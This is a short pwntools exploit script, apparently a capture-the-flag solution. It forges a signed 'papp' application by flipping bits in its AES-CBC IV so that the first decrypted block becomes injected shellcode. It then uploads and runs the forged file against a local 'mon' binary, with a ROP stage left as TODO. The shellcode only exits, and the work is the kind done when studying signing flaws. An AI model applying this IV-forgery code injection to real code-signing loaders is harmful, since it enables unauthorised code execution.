from pwn import *
import hashlib
context.arch = 'amd64'

# assume we already have signed flag1.papp

# step 1: hack aes-cbc iv
blob = bytearray(open('flag1.papp').read())
iv = blob[0x154:0x164]
print str(iv).encode('hex')
first_block = bytearray('4883EC0848BF0000000001000000BE00'.decode('hex'))
our_shellcode = bytearray(asm('''
    xor rdi, rdi;
    mov edi, 0x42;
    mov al, 0x3c;
    syscall
'''))
assert len(our_shellcode) <= len(first_block)
for i in xrange(len(our_shellcode)):
    blob[0x154 + i] = iv[i] ^ first_block[i] ^ our_shellcode[i]

# step 2: append data segment for rop TODO

open('exp2.papp', 'w').write(str(blob))

r = process(['./mon', './init.sys', './loader.sys', './echo.sys',
    './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp'])

def download(app):
    with open(app) as f:
        blob = f.read()
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

download('exp2.papp')
r.sendline('run exp2.papp')

r.interactive()
